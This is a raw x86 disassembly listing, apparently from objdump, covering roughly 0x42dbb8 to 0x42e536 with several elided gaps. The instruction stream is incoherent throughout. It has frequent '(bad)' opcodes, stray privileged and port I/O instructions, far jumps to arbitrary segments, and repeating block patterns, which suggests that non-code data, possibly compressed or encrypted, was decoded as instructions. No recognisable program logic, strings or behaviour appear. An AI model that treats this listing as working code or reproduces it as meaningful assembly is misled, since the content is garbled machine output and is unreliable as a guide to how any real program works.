  42dbb8:	push   cs
  42dbb9:	dec    ebx
  42dbba:	lds    edx,FWORD PTR [edx-0x429d81b3]
  42dbc0:	and    ch,BYTE PTR [edi-0x3e]
  42dbc3:	js     0x42db52
  42dbc5:	out    dx,eax
  42dbc6:	adc    edx,DWORD PTR [esi-0x3e3632e0]
  42dbcc:	les    esp,FWORD PTR [ecx]
  42dbce:	inc    ebp
  42dbcf:	adc    ah,BYTE PTR [edi+0x77]
  42dbd2:	into   
  42dbd3:	xor    BYTE PTR [ecx],ch
  42dbd5:	or     dh,BYTE PTR [ebp-0x4]
  42dbd8:	xchg   ebp,eax
  42dbd9:	and    al,0x6b
  42dbdb:	out    0x91,eax
  42dbdd:	ret    
  42dbde:	pop    eax
  42dbdf:	imul   eax,esp,0xffffffd2
  42dbe2:	loopne 0x42dc5e
  42dbe4:	sbb    DWORD PTR [ebx+eax*1],edx
  42dbe7:	shr    BYTE PTR [edi+0x6d1b9035],1
  42dbed:	loop   0x42dc19
  42dbef:	jp     0x42dc67
  42dbf1:	loope  0x42dbf4
  42dbf3:	imul   ebx,DWORD PTR [eax+0x7b],0x44
  42dbf7:	jbe    0x42dbef
  42dbf9:	ins    DWORD PTR es:[edi],dx
  42dbfa:	pop    ebx
  42dbfb:	ss push ebp
  42dbfd:	(bad)  
  42dbff:	sub    BYTE PTR [eax-0x4208aba9],dh
  42dc05:	ret    
  42dc06:	pop    esi
  42dc07:	ds jb  0x42dc72
  42dc0a:	sub    al,0xb8
  42dc0c:	mov    dl,0x2a
  42dc0e:	pop    edi
  42dc0f:	adc    BYTE PTR [eax-0x3c],ah
  42dc12:	repz mov eax,0xc43c84bb
  42dc18:	arpl   WORD PTR [eax+edi*1],ax
  42dc1b:	sub    eax,0x50c06c5e
  42dc20:	xchg   edx,eax
  42dc21:	fs (bad) 
  42dc23:	(bad)  
  42dc24:	push   ebp
  42dc25:	sbb    dl,BYTE PTR [esi]
  42dc27:	jbe    0x42dbac
  42dc29:	psadbw mm1,QWORD PTR [esp+edx*4]
  42dc2d:	into   
  42dc2e:	dec    eax
  42dc2f:	xor    DWORD PTR [eax-0x425390cf],eax
  42dc35:	in     eax,0x39
  42dc37:	or     ecx,edi
  42dc39:	test   BYTE PTR [ecx-0x66],dl
  42dc3c:	nop
  42dc3d:	dec    esp
  42dc3e:	pusha  
  42dc3f:	shl    DWORD PTR [eax-0x31fefaa5],cl
  42dc45:	cli    
  42dc46:	in     eax,dx
  42dc47:	push   ebp
  42dc48:	inc    edi
  42dc49:	add    DWORD PTR [ebp-0x72],0xffffffc9
  42dc4d:	jne    0x42dc19
  42dc4f:	in     al,dx
  42dc50:	out    dx,eax
  42dc51:	or     al,0x76
  42dc53:	mov    ch,0x4b
  42dc55:	mov    al,ds:0x4c818073
  42dc5a:	fstp   QWORD PTR [edi-0x2d]
  42dc5d:	aam    0x88
  42dc5f:	add    al,0x3d
  42dc61:	adc    DWORD PTR [esi-0x2c641380],ecx
  42dc67:	and    BYTE PTR [edx+0x22425f1e],al
  42dc6d:	iret   
  42dc6e:	xchg   BYTE PTR [eax],ah
  42dc70:	retf   
  42dc71:	mov    ch,BYTE PTR [ebx+0x2d]
  42dc74:	pop    es
  42dc75:	add    ebx,DWORD PTR [ebx-0x4b8db1d4]
  42dc7b:	add    al,0x93
  42dc7d:	jns    0x42dc69
  42dc7f:	(bad)  
  42dc80:	push   ebp
  42dc81:	mov    esi,DWORD PTR [ebx]
  42dc83:	add    al,ah
  42dc85:	aaa    
  42dc86:	sub    bl,BYTE PTR [ecx+0x51de7ceb]
  42dc8c:	mov    ch,0x2b
  42dc8e:	pop    esi
  42dc8f:	mov    edx,0x5f
	...
  42dcf4:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	inc    esp
  42dd01:	into   
  42dd02:	int    0xa4
  42dd04:	inc    eax
  42dd05:	jmp    0x42dd08
  42dd07:	add    BYTE PTR ds:0x2e000001,al
  42dd0d:	mov    ds:0xc696937b,eax
  42dd12:	jb     0x42dd6a
  42dd14:	mov    dh,0x9b
  42dd16:	inc    esi
  42dd17:	cli    
  42dd18:	and    DWORD PTR [ecx+ecx*8+0x5d],eax
  42dd1c:	pop    esi
  42dd1d:	arpl   cx,cx
  42dd1f:	aas    
  42dd20:	jmp    0xac767068
  42dd25:	mov    ch,0xe5
  42dd27:	xchg   DWORD PTR [eax+0x46],ebp
  42dd2a:	and    cl,BYTE PTR [esi]
  42dd2c:	aas    
  42dd2d:	(bad)  
  42dd2e:	loopne 0x42dd8e
  42dd30:	or     eax,0x6edb2907
  42dd35:	in     eax,dx
  42dd36:	icebp  
  42dd37:	inc    edi
  42dd38:	test   DWORD PTR [esi],esi
  42dd3a:	cwde   
  42dd3b:	jp     0x42dcef
  42dd3d:	call   0x6424:0x54092519
  42dd44:	jmp    0x42dccd
  42dd46:	mov    bh,0x66
  42dd48:	test   BYTE PTR [ebx],cl
  42dd4a:	rcr    BYTE PTR [edi+0x7ebcb0b6],0x47
  42dd51:	mov    ebx,0xfd602a77
  42dd56:	out    dx,al
  42dd57:	xor    DWORD PTR [eax-0x59],0xd527d905
  42dd5e:	xchg   ebx,eax
  42dd5f:	pop    esi
  42dd60:	lea    ecx,[ebp-0x45c75be8]
  42dd66:	mov    bl,0x85
  42dd68:	stc    
  42dd69:	in     eax,dx
  42dd6a:	lahf   
  42dd6b:	sbb    al,0x20
  42dd6d:	jno    0x21db5fee
  42dd73:	mov    ds:0x52e41521,eax
  42dd78:	and    edi,DWORD PTR [edx+0x46f3818f]
  42dd7e:	ds out dx,al
  42dd80:	push   ss
  42dd81:	cmp    BYTE PTR [eax+0x4c],0xac
  42dd85:	jne    0x42ddfe
  42dd87:	sbb    cl,BYTE PTR [ebx-0x198a146]
  42dd8d:	mov    DWORD PTR [ebp+eax*1-0x6b82a6b1],ebp
  42dd94:	popa   
  42dd95:	pop    ebx
  42dd96:	adc    eax,0x3b1dca3a
  42dd9b:	push   cs
  42dd9c:	inc    esi
  42dd9d:	fs dec ebp
  42dd9f:	push   ebx
  42dda0:	int    0x5e
  42dda2:	mov    DWORD PTR [ebp+0x59],ecx
  42dda5:	mov    esp,0x6b22b1cb
  42ddaa:	iret   
  42ddab:	sbb    ah,BYTE PTR [edx]
  42ddad:	push   cs
  42ddae:	(bad)  
  42ddaf:	arpl   bx,di
  42ddb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ddb2:	or     al,0x97
  42ddb4:	sub    al,0x11
  42ddb6:	mov    cl,0x25
  42ddb8:	or     eax,0x79f45890
  42ddbd:	dec    esp
  42ddbe:	rcl    DWORD PTR [edi+edi*8+0x2d],cl
  42ddc2:	lods   eax,DWORD PTR ds:[esi]
  42ddc3:	cmp    ch,BYTE PTR [eax+eax*1+0x21]
  42ddc7:	push   cs
  42ddc8:	mov    BYTE PTR [edx-0x5e682356],dh
  42ddce:	loop   0x42dd98
  42ddd0:	popa   
  42ddd1:	push   0xf
  42ddd3:	mov    esi,0xcd54df88
  42ddd8:	lods   eax,DWORD PTR ds:[esi]
  42ddd9:	adc    DWORD PTR [esi+0x7c712eba],ebx
  42dddf:	daa    
  42dde0:	mov    ebx,0x66e3eafa
  42dde5:	cs clc 
  42dde7:	xor    al,0x49
  42dde9:	dec    ebp
  42ddea:	xchg   DWORD PTR [eax],edi
  42ddec:	in     eax,0xa8
  42ddee:	pop    ecx
  42ddef:	sbb    edi,DWORD PTR [edx-0x64ba8130]
  42ddf5:	test   eax,0x106cfd37
  42ddfa:	xchg   edx,eax
  42ddfb:	inc    eax
  42ddfc:	and    DWORD PTR [ebx+0x45190830],esi
  42de02:	cmp    al,0xb5
  42de04:	aad    0x7
  42de06:	mov    ah,BYTE PTR [esp+esi*1-0x2231ed54]
  42de0d:	mov    ebp,0xfa8383
	...
  42de72:	add    BYTE PTR [eax],al
  42de74:	out    0x82,al
  42de76:	lods   eax,DWORD PTR ds:[esi]
  42de77:	xor    ebp,ebp
  42de79:	aas    
  42de7a:	(bad)  
  42de7b:	xlat   BYTE PTR ds:[ebx]
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	repnz fucomi st,st(1)
  42de83:	loopne 0x42deca
  42de85:	in     al,dx
  42de86:	add    DWORD PTR [eax],eax
  42de88:	add    eax,0xde000001
  42de8d:	(bad)  
  42de8e:	dec    ebx
  42de8f:	adc    edi,DWORD PTR [esi-0x6e74178e]
  42de95:	cmp    eax,0x2f98b31a
  42de9a:	in     al,0x5b
  42de9c:	cmp    BYTE PTR [esi-0x75417815],ah
  42dea2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dea3:	jbe    0x42df06
  42dea5:	ja     0x42df18
  42dea7:	xlat   BYTE PTR ds:[ebx]
  42dea8:	and    DWORD PTR [ebx+eax*4],eax
  42deab:	sub    eax,0x5de18ea3
  42deb0:	mov    ebx,0xfa753b2a
  42deb5:	sub    eax,0x9edba217
  42deba:	into   
  42debb:	sub    eax,0x9f927e51
  42dec0:	pop    ebx
  42dec1:	fidivr DWORD PTR [edx+edi*1]
  42dec4:	shl    BYTE PTR [ebp+0x33],0x36
  42dec8:	jmp    0x1e0dc62a
  42decd:	dec    DWORD PTR [edx]
  42decf:	fidivr DWORD PTR [edx+0x8c8e9bc]
  42ded5:	add    edi,esi
  42ded7:	jle    0x42df10
  42ded9:	sahf   
  42deda:	cdq    
  42dedb:	or     al,0xd7
  42dedd:	xor    cl,BYTE PTR [ebp+0x3d]
  42dee0:	xor    ah,BYTE PTR [edx]
  42dee2:	jnp    0x42df4a
  42dee4:	lea    esi,[edi-0x487ab1ae]
  42deea:	aad    0x8f
  42deec:	pop    es
  42deed:	jl     0x42df0b
  42deef:	aam    0xc9
  42def1:	fisttp WORD PTR [edi]
  42def3:	test   BYTE PTR [ebp+0x8],bh
  42def6:	or     al,0x3
  42def8:	(bad)  
  42def9:	mov    al,ds:0xac48c488
  42defe:	scas   al,BYTE PTR es:[edi]
  42deff:	pop    ebp
  42df00:	push   ds
  42df01:	lods   al,BYTE PTR cs:[esi]
  42df03:	repnz imul esi,DWORD PTR gs:[esi+0x45],0xd9609397
  42df0c:	mov    al,0x79
  42df0e:	mov    ebp,0x4bfa5d80
  42df13:	ins    DWORD PTR es:[edi],dx
  42df14:	scas   al,BYTE PTR es:[edi]
  42df15:	js     0x42df04
  42df17:	mov    ch,0xa3
  42df19:	adc    DWORD PTR [ecx+0x3b],ecx
  42df1c:	das    
  42df1d:	ds stos BYTE PTR es:[di],al
  42df20:	xchg   ecx,eax
  42df21:	xrelease mov BYTE PTR [edx],al
  42df24:	pop    ebp
  42df25:	addr16 mov ds:0x29a4,al
  42df29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42df2a:	adc    al,0xbd
  42df2c:	in     eax,0xef
  42df2e:	lahf   
  42df2f:	mov    ah,0x26
  42df31:	and    al,0xad
  42df33:	pusha  
  42df34:	or     al,0x6d
  42df36:	xchg   ebp,eax
  42df37:	add    ebx,DWORD PTR [ecx]
  42df39:	loope  0x42ded7
  42df3b:	push   DWORD PTR [edx]
  42df3d:	inc    ebp
  42df3e:	dec    ebx
  42df3f:	jns    0x42def7
  42df41:	and    DWORD PTR [edx-0x11d6558d],ecx
  42df47:	(bad)  
  42df48:	xchg   ebp,eax
  42df49:	add    al,0x78
  42df4b:	push   ecx
  42df4c:	add    eax,0x7bb7be4a
  42df51:	ror    BYTE PTR [esi+0x638f3904],cl
  42df57:	push   0x28
  42df59:	jg     0x42df2e
  42df5b:	mov    edi,0x6c067127
  42df60:	mov    al,0x2e
  42df62:	cmp    DWORD PTR [ebx],0xfffffff9
  42df65:	lahf   
  42df66:	add    cl,bl
  42df68:	cmp    bh,0xe4
  42df6b:	sti    
  42df6c:	ret    
  42df6d:	into   
  42df6e:	xchg   ebx,eax
  42df6f:	out    dx,eax
  42df70:	punpckhdq mm6,QWORD PTR [esi]
  42df73:	mov    esi,0xf031f36
  42df78:	sbb    edx,DWORD PTR [esi-0x57]
  42df7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42df7c:	stos   BYTE PTR es:[edi],al
  42df7d:	push   ebp
  42df7e:	arpl   WORD PTR [eax-0x633189bf],ax
  42df84:	and    BYTE PTR gs:[edi+ecx*4+0x10],bh
  42df89:	mov    bh,0xe6
  42df8b:	adc    cl,BYTE PTR [esi]
  42df8d:	mov    BYTE PTR [eax+ecx*2],al
  42df90:	push   es
	...
  42dff1:	add    BYTE PTR [eax],al
  42dff3:	add    BYTE PTR [edx],al
  42dff5:	(bad)  
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi-0x2b]
  42e001:	scas   eax,DWORD PTR es:[edi]
  42e002:	stc    
  42e003:	or     BYTE PTR [edx-0x13],0x1
  42e007:	add    BYTE PTR ds:0x35000001,al
  42e00d:	aad    0xe8
  42e00f:	das    
  42e010:	test   al,0x47
  42e012:	ret    
  42e013:	inc    ebx
  42e014:	dec    edx
  42e015:	repnz ss leave 
  42e018:	mov    ch,0x5d
  42e01a:	ret    0xb19e
  42e01d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e01e:	push   esp
  42e01f:	out    dx,eax
  42e020:	push   edi
  42e021:	call   0xed6bac52
  42e026:	int3   
  42e027:	retf   
  42e028:	push   es
  42e029:	mov    DWORD PTR [esi+0x2f084ba7],ebx
  42e02f:	mov    ds:0x2e760ca3,al
  42e034:	jg     0x42e083
  42e036:	and    al,0xdf
  42e038:	xchg   ebx,eax
  42e039:	dec    edi
  42e03a:	sub    eax,ecx
  42e03c:	ds pop esi
  42e03e:	(bad)  
  42e03f:	fld1   
  42e041:	push   0xc6d333dc
  42e046:	ds in  eax,dx
  42e048:	add    al,0x43
  42e04a:	aaa    
  42e04b:	sub    cl,BYTE PTR ds:0x6489d58e
  42e051:	push   ebp
  42e052:	cmp    ah,BYTE PTR ds:0x2b278fc0
  42e058:	push   eax
  42e059:	pusha  
  42e05a:	mov    ds:0x51c182b2,al
  42e05f:	aas    
  42e060:	repz push ebx
  42e062:	mov    ch,0xc7
  42e064:	xchg   ecx,eax
  42e065:	das    
  42e066:	es ja  0x42e0a2
  42e069:	and    DWORD PTR [edx],esi
  42e06b:	xor    DWORD PTR [ebx],esp
  42e06d:	mov    cl,ah
  42e06f:	inc    ecx
  42e070:	(bad)  
  42e071:	data16 addr16 mov dh,0xc3
  42e075:	inc    esi
  42e076:	push   esp
  42e077:	and    al,0xb0
  42e079:	xor    DWORD PTR [ecx+0x5b],ecx
  42e07c:	loopne 0x42e089
  42e07e:	jp     0x42e06c
  42e080:	jb     0x42e08e
  42e082:	ins    BYTE PTR es:[edi],dx
  42e083:	mov    ebx,0x1f7ead7a
  42e088:	sbb    al,0xac
  42e08a:	pop    esp
  42e08b:	xchg   esp,eax
  42e08c:	xor    edi,0xffffff90
  42e08f:	sub    eax,DWORD PTR [eax+ebx*1]
  42e092:	xor    ecx,edi
  42e094:	sbb    DWORD PTR [ebp+0x6b762ae],ecx
  42e09a:	ins    DWORD PTR es:[edi],dx
  42e09b:	push   esp
  42e09c:	fadd   st(0),st
  42e09e:	xchg   ecx,eax
  42e09f:	shl    ah,0xcb
  42e0a2:	cmp    al,0x97
  42e0a4:	xlat   BYTE PTR ds:[ebx]
  42e0a5:	outs   dx,DWORD PTR ds:[esi]
  42e0a6:	sahf   
  42e0a7:	add    eax,0xad31ea96
  42e0ac:	cli    
  42e0ad:	pop    esi
  42e0ae:	cwde   
  42e0af:	pop    ebp
  42e0b0:	xchg   ecx,esi
  42e0b2:	sbb    cl,ch
  42e0b4:	push   0xfffffffd
  42e0b6:	sbb    BYTE PTR [edx],ch
  42e0b8:	sbb    al,0xab
  42e0ba:	adc    BYTE PTR [eiz*4+0x3ded90d4],ah
  42e0c1:	push   ss
  42e0c2:	mov    cl,bl
  42e0c4:	(bad)  
  42e0c5:	out    0x9a,eax
  42e0c7:	pop    esi
  42e0c8:	aas    
  42e0c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e0ca:	aam    0xb
  42e0cc:	ja     0x42e146
  42e0ce:	fbld   TBYTE PTR [esp+ebx*4]
  42e0d1:	not    esp
  42e0d3:	adc    eax,0x7ffbf29a
  42e0d8:	jmp    0xbf92:0x82203775
  42e0df:	mov    al,BYTE PTR [edx+ebp*1+0x58]
  42e0e3:	add    DWORD PTR [ecx+0x51],esp
  42e0e6:	and    eax,ebp
  42e0e8:	or     DWORD PTR [ebx+0x119465ce],edi
  42e0ee:	push   ebx
  42e0ef:	xor    ah,BYTE PTR [esi]
  42e0f1:	mov    al,0xa3
  42e0f3:	test   DWORD PTR [edx],ecx
  42e0f5:	(bad)  
  42e0f6:	fcomp  QWORD PTR [esi+0x263f2a25]
  42e0fc:	jp     0x42e167
  42e0fe:	xchg   esp,eax
  42e0ff:	xor    ch,BYTE PTR [eax+0x263a6fcd]
  42e105:	sub    BYTE PTR [edx+0x79],dh
  42e108:	push   esp
  42e109:	adc    BYTE PTR [ebx+0x7db58524],0x7a
  42e110:	ja     0x42e112
	...
  42e172:	add    BYTE PTR [eax],al
  42e174:	mov    eax,ds:0x7e061ecf
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	push   eax
  42e181:	pop    ebp
  42e182:	(bad)  
  42e184:	dec    edi
  42e185:	out    dx,al
  42e186:	add    DWORD PTR [eax],eax
  42e188:	add    eax,0x85000001
  42e18d:	xor    DWORD PTR [ebp+0xabe1311],0xea37ed1
  42e197:	or     eax,0x18bf4421
  42e19c:	call   0x82cf:0xa4a8885e
  42e1a3:	xchg   ebp,eax
  42e1a4:	imul   eax,DWORD PTR [eax+0x27],0xffffffd7
  42e1a8:	pop    eax
  42e1a9:	ins    DWORD PTR es:[edi],dx
  42e1aa:	arpl   WORD PTR [eax+0x16],cx
  42e1ad:	int    0x80
  42e1af:	add    eax,0x11bd5da
  42e1b4:	dec    esp
  42e1b5:	sbb    esi,DWORD PTR [ebp+0x57]
  42e1b8:	mov    ecx,0xcdcc6e5a
  42e1bd:	loopne 0x42e1c8
  42e1bf:	imul   ebx,DWORD PTR ds:0xbef664de,0x3a216f52
  42e1c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e1ca:	std    
  42e1cb:	outs   dx,BYTE PTR ds:[esi]
  42e1cc:	or     eax,0xa29c968c
  42e1d1:	rcr    BYTE PTR [eax],0x33
  42e1d4:	in     al,dx
  42e1d5:	mov    edi,0x232650e0
  42e1da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e1db:	inc    esp
  42e1dc:	ins    BYTE PTR es:[edi],dx
  42e1dd:	adc    eax,0x337c2eab
  42e1e2:	mov    al,ds:0xe78b3e66
  42e1e7:	in     al,0x13
  42e1e9:	cmp    ah,dh
  42e1eb:	inc    ecx
  42e1ec:	pop    ss
  42e1ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e1ee:	pop    eax
  42e1ef:	sbb    DWORD PTR [ebx],eax
  42e1f1:	loop   0x42e1b8
  42e1f3:	call   0x8a9643fb
  42e1f8:	ror    BYTE PTR ds:0xecb5bee2,0x3a
  42e1ff:	fs cs retf 0x9fcf
  42e204:	adc    BYTE PTR [edx+0x2f],bl
  42e207:	push   0xbc10dc0
  42e20c:	fs sbb esi,esi
  42e20f:	loope  0x42e248
  42e211:	lea    ecx,[esi]
  42e213:	iret   
  42e214:	sub    BYTE PTR [ebx+eiz*2-0x5c869975],cl
  42e21b:	push   0xffffffa4
  42e21d:	xor    al,0x27
  42e21f:	aas    
  42e220:	inc    ecx
  42e221:	jbe    0x42e1c8
  42e223:	jmp    0x42e1dc
  42e225:	or     BYTE PTR [ebx],ch
  42e227:	int3   
  42e228:	mov    al,ds:0xe697d30d
  42e22d:	stos   DWORD PTR es:[edi],eax
  42e22e:	inc    esp
  42e22f:	out    dx,al
  42e230:	sub    DWORD PTR [ecx+0x76],edx
  42e233:	push   ecx
  42e234:	repnz xchg ebx,eax
  42e236:	in     al,0x7a
  42e238:	xchg   ebp,eax
  42e239:	xchg   DWORD PTR [ebx],ecx
  42e23b:	enter  0x500d,0xd9
  42e23f:	dec    ebx
  42e240:	int3   
  42e241:	test   BYTE PTR [edx-0x71],cl
  42e244:	cmc    
  42e245:	lods   al,BYTE PTR ds:[esi]
  42e246:	stos   DWORD PTR es:[edi],eax
  42e247:	jbe    0x42e2ad
  42e249:	mov    dh,0x77
  42e24b:	(bad)  [edx+esi*8-0x2ca2c4f4]
  42e252:	xor    bh,bl
  42e254:	adc    al,0xdb
  42e256:	in     eax,0xce
  42e258:	and    DWORD PTR [ebx],edi
  42e25a:	xchg   esp,eax
  42e25b:	add    DWORD PTR [ecx+0x50],esp
  42e25e:	mov    cl,0x79
  42e260:	lock sub BYTE PTR [edx],0x2a
  42e264:	xchg   edx,eax
  42e265:	dec    esi
  42e266:	xor    ebp,ebx
  42e268:	xor    al,0x97
  42e26a:	stos   BYTE PTR es:[edi],al
  42e26b:	xchg   edi,eax
  42e26c:	sub    al,0x9b
  42e26e:	into   
  42e26f:	add    BYTE PTR [ecx+eax*2-0x3c],cl
  42e273:	mov    dl,0xe9
  42e275:	in     al,dx
  42e276:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e277:	or     BYTE PTR [ecx+0x71],ah
  42e27a:	outs   dx,BYTE PTR ds:[esi]
  42e27b:	(bad)  
  42e27c:	xchg   esi,eax
  42e27d:	xchg   esp,eax
  42e27e:	int3   
  42e27f:	xchg   ecx,eax
  42e280:	out    0x71,eax
  42e282:	push   0x28de6c5b
  42e287:	and    al,0xaf
  42e289:	push   0xe7bca04b
  42e28e:	into   
  42e28f:	pusha  
  42e290:	mov    eax,DWORD PTR [eax]
	...
  42e2f2:	add    BYTE PTR [eax],al
  42e2f4:	lods   eax,DWORD PTR ds:[esi]
  42e2f5:	cmp    eax,0xb79aa78a
  42e2fa:	lods   eax,DWORD PTR ds:[esi]
  42e2fb:	aas    
  42e2fc:	mov    ebx,0x8f199140
  42e301:	mov    dl,0xd3
  42e303:	pop    es
  42e304:	push   esp
  42e305:	out    dx,eax
  42e306:	add    DWORD PTR [eax],eax
  42e308:	add    eax,0x14000001
  42e30d:	add    edx,DWORD PTR [edx]
  42e30f:	out    0x7d,al
  42e311:	sub    esp,DWORD PTR [eax-0x7b30b59d]
  42e317:	inc    edi
  42e318:	pop    edx
  42e319:	xchg   edi,eax
  42e31a:	jmp    0x8995:0x5f645387
  42e321:	retf   
  42e322:	lds    ebp,FWORD PTR [edi+0x4e0ea225]
  42e328:	inc    ebp
  42e329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e32a:	push   ebx
  42e32b:	mov    ds:0x5687af68,al
  42e330:	int3   
  42e331:	and    esp,DWORD PTR ds:0x467236dd
  42e337:	cs icebp 
  42e339:	jmp    0x42e2fb
  42e33b:	mov    ecx,0xcb13398d
  42e340:	xor    ebp,DWORD PTR [edx]
  42e342:	popa   
  42e343:	sti    
  42e344:	mov    BYTE PTR [edx+esi*1-0x17b65560],al
  42e34b:	fstp   TBYTE PTR [edi-0x10]
  42e34e:	out    0x8,eax
  42e350:	mov    esi,DWORD PTR [eax]
  42e352:	paddsb mm4,QWORD PTR [esi]
  42e355:	sub    BYTE PTR [esi+ebx*2-0x321e59b5],0xfc
  42e35d:	push   es
  42e35e:	mov    dl,0x65
  42e360:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e361:	(bad)  
  42e362:	lds    esp,FWORD PTR [edx]
  42e364:	int3   
  42e365:	mov    ebp,0x8755456d
  42e36a:	repz fisubr WORD PTR [ebx-0x27]
  42e36e:	(bad)  
  42e36f:	in     al,dx
  42e370:	enter  0x2d27,0x45
  42e374:	push   ss
  42e375:	cld    
  42e376:	cld    
  42e377:	push   esp
  42e378:	std    
  42e379:	push   esp
  42e37a:	xor    ebp,0x163ad1a8
  42e380:	arpl   si,sp
  42e382:	enter  0xb657,0x2c
  42e386:	cli    
  42e387:	js     0x42e3a1
  42e389:	out    dx,al
  42e38a:	pop    eax
  42e38b:	sbb    BYTE PTR [edi],dl
  42e38d:	into   
  42e38e:	pop    es
  42e38f:	aad    0x4
  42e391:	int    0xd1
  42e393:	out    dx,eax
  42e394:	ret    0xf745
  42e397:	inc    esi
  42e398:	outs   dx,DWORD PTR ds:[esi]
  42e399:	sti    
  42e39a:	jp     0x42e341
  42e39c:	data16 cld 
  42e39e:	jae    0x42e3b3
  42e3a0:	fsubr  DWORD PTR [esi]
  42e3a2:	jge    0x42e362
  42e3a4:	mov    cl,0xa2
  42e3a6:	lods   al,BYTE PTR ds:[esi]
  42e3a7:	push   cs
  42e3a8:	jnp    0x42e395
  42e3aa:	in     eax,0xac
  42e3ac:	adc    BYTE PTR [edx],ah
  42e3ae:	push   edx
  42e3af:	call   0xdb1b:0x5f7c667f
  42e3b6:	mov    ebx,0xcc84fb17
  42e3bb:	(bad)  
  42e3bd:	cs mov ebp,0x9bab029f
  42e3c3:	icebp  
  42e3c4:	std    
  42e3c5:	imul   ebx,DWORD PTR [ebp-0x65],0x3d
  42e3c9:	mov    ah,dl
  42e3cb:	xchg   ebp,eax
  42e3cc:	fs mov esp,0xbe93344e
  42e3d2:	pop    es
  42e3d3:	mov    eax,ds:0xc5047ae7
  42e3d8:	loopne 0x42e387
  42e3da:	out    dx,al
  42e3db:	(bad)  
  42e3dc:	nop
  42e3dd:	hlt    
  42e3de:	adc    eax,0xcf7aa0e3
  42e3e3:	sbb    eax,0xe21e6940
  42e3e8:	mov    cl,0x14
  42e3ea:	int    0xf2
  42e3ec:	mov    ecx,DWORD PTR [esi+0x3ef26af3]
  42e3f2:	adc    eax,0x8342fb2f
  42e3f7:	push   ss
  42e3f8:	inc    ebx
  42e3f9:	inc    DWORD PTR ds:0x1f55a7e7
  42e3ff:	and    dh,BYTE PTR [eax+eax*2]
  42e402:	cmp    al,0x38
  42e404:	adc    al,0x12
  42e406:	sbb    dh,ch
  42e408:	(bad)  
  42e409:	jmp    0xa6f7d79
  42e40e:	sbb    ah,BYTE PTR ds:0xd
	...
  42e474:	loop   0x42e433
  42e476:	fadd   st(7),st
  42e478:	(bad)  
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	int3   
  42e481:	or     esp,edx
  42e483:	retf   0xf059
  42e486:	add    DWORD PTR [eax],eax
  42e488:	add    eax,0xb3000001
  42e48d:	sbb    bh,dl
  42e48f:	popa   
  42e490:	lds    esp,FWORD PTR [ecx-0x26]
  42e493:	mov    edx,eax
  42e495:	loope  0x42e492
  42e497:	fadd   DWORD PTR [edx+0x3b]
  42e49a:	call   0x8e7d:0xc3d2686b
  42e4a1:	inc    ebp
  42e4a2:	fisub  WORD PTR [edi-0x2676b989]
  42e4a8:	loopne 0x42e4eb
  42e4aa:	mov    dh,0xbc
  42e4ac:	push   0x66e08c9b
  42e4b1:	mov    eax,0x17264e79
  42e4b6:	in     eax,dx
  42e4b7:	mov    ch,0x59
  42e4b9:	adc    edx,DWORD PTR [edx+0x6ca51322]
  42e4bf:	lods   al,BYTE PTR ds:[esi]
  42e4c0:	das    
  42e4c1:	jb     0x42e4f0
  42e4c3:	mov    bl,BYTE PTR [ecx]
  42e4c5:	mov    ebx,0xe68dea35
  42e4ca:	dec    edx
  42e4cb:	icebp  
  42e4cc:	dec    ecx
  42e4cd:	push   esp
  42e4ce:	call   FWORD PTR [ecx]
  42e4d0:	push   edi
  42e4d1:	mov    al,ds:0xbd2475f0
  42e4d6:	int    0xc7
  42e4d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e4d9:	test   eax,0xe8801f1c
  42e4de:	stos   BYTE PTR es:[edi],al
  42e4df:	cdq    
  42e4e0:	aam    0xea
  42e4e2:	dec    esp
  42e4e3:	(bad)  
  42e4e4:	hlt    
  42e4e5:	sub    DWORD PTR [esp+eax*4+0x4],eax
  42e4e9:	std    
  42e4ea:	adc    bl,bh
  42e4ec:	sub    dh,cl
  42e4ee:	jbe    0x42e472
  42e4f0:	xor    BYTE PTR [edx+0x38],ah
  42e4f3:	dec    ebp
  42e4f4:	adc    al,0x40
  42e4f6:	sub    dl,al
  42e4f8:	mov    ?,edi
  42e4fa:	jl     0x42e558
  42e4fc:	cmp    eax,esi
  42e4fe:	dec    edx
  42e4ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e500:	and    dh,BYTE PTR ds:0x9d637310
  42e506:	int    0x52
  42e508:	hlt    
  42e509:	test   BYTE PTR [ecx+esi*2],0xab
  42e50d:	lahf   
  42e50e:	or     ch,BYTE PTR [edx]
  42e510:	push   es
  42e511:	push   esi
  42e512:	lds    ecx,FWORD PTR [ebx+0x44]
  42e515:	daa    
  42e516:	ins    BYTE PTR es:[edi],dx
  42e517:	call   0xa554:0x8d9f5a11
  42e51e:	addr16 jno 0x42e57f
  42e521:	push   eax
  42e522:	(bad)  
  42e523:	jmp    0x10c3:0xc747cb4e
  42e52a:	cmp    BYTE PTR [ebx-0x1f],al
  42e52d:	push   cs
  42e52e:	pop    ecx
  42e52f:	pop    ss
  42e530:	rcr    BYTE PTR [esi],0xe7
  42e533:	aaa    
  42e534:	popa   
  42e535:	xchg   edx,eax
  42e536:	shl    BYTE PTR [ecx+0x428ae48f],cl
